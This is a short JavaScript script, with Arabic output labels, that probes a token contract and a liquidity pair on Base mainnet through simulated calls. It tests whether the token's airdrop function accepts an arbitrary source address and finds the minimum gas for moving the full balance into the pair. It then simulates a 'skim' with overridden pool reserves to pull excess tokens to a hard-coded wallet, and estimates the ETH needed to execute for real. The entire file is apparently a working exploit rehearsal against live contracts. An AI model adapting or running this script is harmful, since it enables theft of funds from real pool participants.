const R = "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const ME = "0xA4BC81CecCC9D8637147Fa4b5daAf55E8f9Ef33f";

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const s32 = n => "0x" + BigInt(n).toString(16).padStart(64, "0");
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };

const eth = BigInt((await j("eth_getBalance", [ME, "latest"])).result);
const bal = await bn(T, "0x70a08231" + pad(ME));
const balT = await bn(T, "0x70a08231" + pad(P));
const balW = await bn(W, "0x70a08231" + pad(P));
console.log("ETH:", Number(eth) / 1e18, "| SLOP:", bal.toString(), "| غاز متاح:", Number(eth / 8000000n));

const mk = (from, amt) => "0x983bc41b" + w32(0x60) + pad(from) + w32(amt) + w32(1) + pad(P);
const tryA = async (lbl, from, amt, gas) => {
  const r = await j("eth_call", [{ from: ME, to: T, data: mk(from, amt), gas: "0x" + gas.toString(16) }, "latest"]);
  console.log((r.error ? "✗ " : "✓ ") + lbl);
  return !r.error;
};

console.log("\n=== هوية المعامل الثاني ===");
await tryA("المصدر = ME", ME, 1000000000n, 300000);
await tryA("المصدر = عنوان فارغ", "0x000000000000000000000000000000000000dEaD", 1000000000n, 300000);

console.log("\n=== المبلغ الكامل ===");
const full = await tryA("airdrop الكل", ME, bal, 400000);

console.log("\n=== أدنى غاز ===");
let low = 0n;
for (let g = 60000; g <= 400000; g += 20000) {
  const r = await j("eth_call", [{ from: ME, to: T, data: mk(ME, bal), gas: "0x" + g.toString(16) }, "latest"]);
  if (!r.error) { low = BigInt(g); console.log("  يكفي عند", g); break; }
}
if (!low) console.log("  لم يكف حتى 400k");

const resOv = { [P]: { stateDiff: { [s32(8)]: "0x" + (balW | ((balT - bal) << 112n)).toString(16).padStart(64, "0") } } };
const sk = await j("eth_call", [{ from: ME, to: P, data: "0xbc25cf77" + pad(ME), gas: "0x30000" }, "latest", resOv]);
console.log("\nskim بعد الوصول:", sk.error ? "✗ " : "✓");

const need = (low + 40000n + 20000n) * 8000000n;
console.log("الغاز المطلوب:", Number(low + 60000n), "| ETH:", Number(need) / 1e18, "| يكفي:", eth >= need);
